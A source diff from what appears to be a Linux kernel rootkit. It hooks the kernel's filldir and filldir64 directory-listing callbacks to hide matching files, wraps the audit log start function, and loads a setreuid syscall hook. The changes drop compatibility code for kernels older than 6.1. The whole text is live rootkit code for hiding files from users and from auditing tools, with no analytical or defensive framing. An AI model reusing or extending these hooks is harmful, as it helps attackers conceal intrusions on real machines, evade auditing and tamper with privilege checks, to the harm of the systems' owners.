@@ -757,20 +757,11 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
 	return real_audit_log_start(ctx, gfp_mask, type);
 }
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 static bool (*real_filldir)(struct dir_context *, const char *, int, loff_t,
 			    u64, unsigned int);
 static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,
 		      loff_t offset, u64 ino, unsigned int d_type)
 {
-#else
-static int (*real_filldir)(struct dir_context *, const char *, int, loff_t, u64,
-			   unsigned int);
-static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
-		     loff_t offset, u64 ino, unsigned int d_type)
-{
-#endif
-
 	/** For certain hidden files we don't have inode number initially,
      * when hidden with "hide-file-anywhere" but it is available here
      * and it is updated below, if needed.
@@ -783,20 +774,11 @@ static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
 	return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 static bool (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
 			      u64, unsigned int);
 static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 			loff_t offset, u64 ino, unsigned int d_type)
 {
-#else
-static int (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
-			     u64, unsigned int);
-static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
-		       loff_t offset, u64 ino, unsigned int d_type)
-{
-#endif
-
 	if (fs_search_name(name, ino))
 		return 0;
 	return real_filldir64(ctx, name, namlen, offset, ino, d_type);
@@ -1136,7 +1118,7 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 		/** Direct call. @see m_kill */
 		ks.k_sys_setreuid = (sys64)_load_syscall_variant(
 			&ks, _sys_arch("sys_setreuid"));
-		;
+
 		if (!ks.k_sys_setreuid)
 			prwarn("invalid data: syscall hook setreuid will not work\n");
 
